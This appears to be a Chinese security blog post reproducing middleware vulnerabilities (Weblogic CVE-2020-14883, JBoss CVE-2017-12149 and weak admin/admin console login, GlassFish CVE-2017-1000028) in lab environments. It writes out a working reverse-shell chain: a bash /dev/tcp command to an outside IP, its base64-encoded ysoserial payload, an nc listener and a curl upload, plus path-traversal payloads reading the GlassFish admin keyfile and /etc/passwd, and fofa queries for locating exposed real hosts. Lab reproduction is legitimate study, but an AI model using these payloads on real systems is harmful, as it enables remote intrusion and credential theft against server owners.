#  中间件安全-CVE漏洞复现-Weblogic+JBoss+GlassFish   
原创 兰陵猪猪哼  小黑子安全   2024-04-08 07:54  
  
服务攻防测试流程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVrbIkokbwdY8govdtJticWfvlzKYtx9ibHPYOKfjZn3WfKU89nqY2J7UQ/640?wx_fmt=png&from=appmsg "")  
  
使用  
vulfocus  
靶场：  
  
案例演示：  
中间件-Weblogic-工具  
梭哈  
  
探针默认端口：7001，Weblogic是Oracle公司推出的J2EE应用服务器  
  
使用  
vulfocus  
靶场复现漏洞  
  
漏洞：weblogic-cve_2020_14883  
  
启动环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV6v4koc50KZqnP63wfkeZUyOAibsQuOo96dgOmvrCeruVerVLNPyBadQ/640?wx_fmt=png&from=appmsg "")  
  
工具：  
https://github.com/ghealer/GUI_Tools  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVtMWVAMtq52hST5adY0naAXoRmYBsfuRP9syDfUR7o6tmhF3psd3KxQ/640?wx_fmt=png&from=appmsg "")  
  
使用工具检测漏洞，在工具输入漏洞网址  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVH8MeCYJ2HmUymoPTliaHQYFQPLWHNI7tMToOlXNyLiadGUCPuGnGicd8Q/640?wx_fmt=png&from=appmsg "")  
  
执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVaw4d4kia4UVyMnfrl8cVpUSEpeLqyx0LjFwbhqdicjIoal0FhMOOA8BQ/640?wx_fmt=png&from=appmsg "")  
  
使用  
vulhub  
靶场：  
  
案例演示：中间件-JBoos-工具脚本梭哈  
  
Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。  
  
漏洞：  
jboss
web  
控制台  
   
弱口令  
  
fofa  
语法：  
"JBoss"
&& title=="Welcome to JBoss&trade;"  
  
使用  
fofa  
搜索到资产，打开网站，进入  
jboss web   
控制台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVKrIPlx153N4S3EqRsbW1vbI2PBLjXASEBm0ia0zmelT2qib6auI8mSoA/640?wx_fmt=png&from=appmsg "")  
  
需要登录，使用弱口令：  
admin/admin   
成功登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVGSoxAxic32K6FQbOKaHic2JuCN9jJwl0RKIE4hJdtbvibQN29HSY6OnOw/640?wx_fmt=png&from=appmsg "")  
  
漏洞：  
JBoss  
中间件  
   
CVE-2017-12149  
  
使用  
vulhub  
靶场开启环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVtnNwvdpXMZExTZicqnTBXRmt91Z4cYG0OGnmcZF6BgN4gmxImZr9dHQ/640?wx_fmt=png&from=appmsg "")  
  
我们使用  
bash  
来反弹  
shell  
，但由于  
Runtime.getRuntime().exec()  
中不能使用管道符等  
bash  
需要的方法，我们需要用进行一次编码。  
  
命令：  
bash -i
>& /dev/tcp/43.134.241.1  
93  
/5566
0>&1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVRPsqoerGSmMjFQLWF9hFzDKnanoTeticZAYS9Ub3KuL3bic8YpoXpjBw/640?wx_fmt=png&from=appmsg "")  
  
使用工具：  
https://github.com/frohoff/ysoserial  
    
来生成反弹  
shell  
的  
poc  
文件  
  
使用工具执行命令：  
java -jar
ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzQuMjQxLjEzOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}"
> poc.ser  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVgtCEBBYF4y0TE0LcHvtia3c12cxQa6zFkm0A5V4tLSV56qu2Cp4jVuA/640?wx_fmt=png&from=appmsg "")  
  
在工具目录下生成一个  
poc.esr  
文件，这个文件就是  
java  
编写的执行反弹  
shell  
命令的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVPe2HXiaDE4efrnwAVficJVKWccHYHv9EcBDoJTibAIft6108ibD8KZ6EiaA/640?wx_fmt=png&from=appmsg "")  
  
服务器开启监听端口  
5566  
  
命令：  
nc -lvvp 5566  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVFx58P0f0V8BVC8kSJBOZpHsTXJLTQIMia0aTibRtsDXH9Rquibp2vjxgQ/640?wx_fmt=png&from=appmsg "")  
  
然后在当前目录执行命令将  
poc  
文件上传到目标目录  
  
命令：curl  
http://  
192.168.163.128  
:  
8080  
/invoker/readonly  
 --data-binary @poc.ser  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVzSJ6ic3612YB8VkXBbOlglcr5ibEoqa1UUibV94lY6JL8shS7eXZl50Gw/640?wx_fmt=png&from=appmsg "")  
  
服务器成功获取  
shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVhWH9T44ictTeC9q18caENwHticZfEZeicorpaG7oa6QCVwbZnL7tPe7Ew/640?wx_fmt=png&from=appmsg "")  
  
案例演示：GlassFish 任意文件读取漏洞（  
CVE-2017-1000028  
）  
  
探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器  
  
影响版本  
  
Oracle
GlassFish Server Open Source Edition 4.1  
版本  
  
fofa  
搜索语法：  
"glassfish"
&& port="4848"  
  
复现漏洞路径：  
  
读密码：/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile  
  
读windows文件：/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini  
  
读linux文件：/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  
  
开启漏洞环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVsdAH82taiaWbl5USSbw5OnWCs92afQ8Gf87yFhaVHYtOA1ZkZHc9icTw/640?wx_fmt=png&from=appmsg "")  
  
读取密码文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV8CC5KHxQuAgbjoYkrT0VKmDgjDZeBekLUaQA9Cya1wLfZc134xrVHg/640?wx_fmt=png&from=appmsg "")  
  
读取  
linux  
敏感文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVrJvT9e5E4QkwrbmevSwZfAaYRd76LU6bYjW4fYqj8iaUddP2CTPwKQw/640?wx_fmt=png&from=appmsg "")  
  
网络安全技术交流群：wx加我好友，备注“进群”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9ibb0kbHCImS2ldibAAaXVDGRKsYsrwDjQmnYKiauv2Vz2eknbKu3CoVokgYhb09xbGUpBxLqSVsdJBDmic1oiclmA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
QQ群：708769345  
  
  
